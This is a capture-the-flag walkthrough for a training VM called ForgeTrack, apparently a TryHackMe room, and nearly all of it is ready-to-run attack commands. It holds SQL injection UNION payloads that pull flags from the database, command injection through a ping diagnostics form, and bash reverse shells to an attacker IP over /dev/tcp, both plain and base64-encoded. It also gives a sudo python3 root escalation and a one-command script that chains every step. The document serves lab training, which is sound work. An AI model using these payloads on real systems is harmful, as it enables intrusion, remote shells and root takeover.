# Attacker playbook — getting the flags

Run every command in this file **from your attacker machine** (Kali, Parrot,
WSL, or your VMware host). The target is the ForgeTrack VM.

> Authorised lab use only. Do not run these payloads against systems you do
> not own or have written permission to test.

```bash
TARGET=http://VM_IP          # the ForgeTrack VM
ATK=ATTACKER_IP              # YOUR address, reachable from the VM
PORT=4444
```

---

## Phase 1 — Recon

```bash
nmap -sV -p- --min-rate 2000 "$TARGET"
```

Expect `22/tcp ssh` and `80/tcp http` only.

```bash
curl -sSI "$TARGET/"
curl -sS "$TARGET/" | grep -o 'Built for the next lap'
curl -sS "$TARGET/" | grep -o 'href="/diagnostics"'
```

## Phase 2 — Four web flags (SQL injection)

Every query returns six columns: `id, build_code, name, status, car_code, notes`.

```bash
# 1 / 4 - search injection
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='search' -- " \
  "$TARGET/builds/search" | grep -oE 'RFM\{[^}]*\}'

# 2 / 4 - numeric UNION
curl -sS --get \
  --data-urlencode "id=0 UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='union' -- " \
  "$TARGET/builds/view" | grep -oE 'RFM\{[^}]*\}'

# 3 / 4 - blind boolean oracle (automated)
python3 get-blind-flag.py "$TARGET"

# 4 / 4 - remediation flag via the vulnerable search route
curl -sS --get \
  --data-urlencode "query=%' ) UNION SELECT 1,challenge,flag_value,'flag','lab','retrieved' FROM flags WHERE challenge='remediation' -- " \
  "$TARGET/builds/search" | grep -oE 'RFM\{[^}]*\}'
```

Or all four at once:

```bash
bash get-web-flags.sh "$TARGET"
```

## Phase 3 — Web-to-OS foothold

The Diagnostics page shells out to `ping` with user input.

```bash
curl -sS --get --data-urlencode 'host=127.0.0.1; id' \
  "$TARGET/diagnostics/ping" | grep -oE 'uid=[0-9]+\([^)]*\)'
```

Expected: `uid=33(www-data)`.

### Manual reverse shell

Terminal 1 (attacker):

```bash
nc -lvnp "$PORT"
```

Terminal 2 (attacker):

```bash
curl -sS --get \
  --data-urlencode "host=127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/$ATK/$PORT 0>&1' >/dev/null 2>&1 &" \
  "$TARGET/diagnostics/ping"
```

If quoting breaks, use base64:

```bash
PAYLOAD=$(printf '%s' "bash -i >& /dev/tcp/$ATK/$PORT 0>&1" | base64 -w0)
curl -sS --get \
  --data-urlencode "host=127.0.0.1; echo $PAYLOAD | base64 -d | bash &" \
  "$TARGET/diagnostics/ping"
```

Fully automated (listener + payload + flag capture):

```bash
python3 get-reverse-shell.py "$TARGET" --attacker "$ATK" --port "$PORT"
```

### Upgrade the shell

In the `nc` session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then back on the attacker terminal:
stty raw -echo; fg
export TERM=xterm
```

## Phase 4 — Capture the user flag

```bash
id                                   # uid=33(www-data)
cat /home/forge/user.txt
```

The file is `640 root:www-data`, so `www-data` can read it.

## Phase 5 — Privilege escalation

```bash
sudo -n -l
# (root) NOPASSWD: /usr/bin/python3

sudo -n /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
id                                   # uid=0(root)
```

The sudo rule allows the Python *binary*, so Python becomes a root shell.

## Phase 6 — Capture the root flag

```bash
cat /root/root.txt
```

The file is `400 root`, so only root can read it.

---

## Shortcut — both OS flags without a shell

```bash
bash get-os-flags.sh "$TARGET"
```

Or manually:

```bash
PAYLOAD=$(cat <<'EOF'
127.0.0.1; echo __USER_FLAG__; cat /home/forge/user.txt; echo __ROOT_FLAG__; sudo -n /usr/bin/python3 -c "import os; os.system('cat /root/root.txt')"; echo __END__
EOF
)
curl -sS --get --data-urlencode "host=$PAYLOAD" "$TARGET/diagnostics/ping"
```

## Everything in one command

```bash
bash attack.sh http://VM_IP ATTACKER_IP
```

This performs recon, collects all four web flags, collects both OS flags, then
opens the automated reverse shell and escalates to root.

## Submitting

Paste each captured `RFM{...}` / `THM{...}` value into the corresponding
TryHackMe question. If the VM still has the installer defaults, the OS flags
will read `THM{REPLACE_USER_FLAG}` and `THM{REPLACE_ROOT_FLAG}` — ask the box
owner to set the real values before release.

## If something fails

| Symptom | Fix |
|---|---|
| Payload gives `0 matching record(s)` | Start the query with `%' )` to close the string and parenthesis |
| Blind script hangs | It uses `substring()` equality; do not switch to `LIKE` (`_` is a wildcard) |
| Injection shows your own UID | You are testing the dev server, not the VM |
| `sudo -n -l` asks for a password | The weak sudo rule is missing; rebuild with `install.sh` |
| Reverse shell never connects | Wrong `ATK` IP, VMware NAT isolation, or host firewall on port 4444 |
| `curl: connection refused` | VM services down: check `systemctl is-active nginx postgresql forgetrack` in the VM |
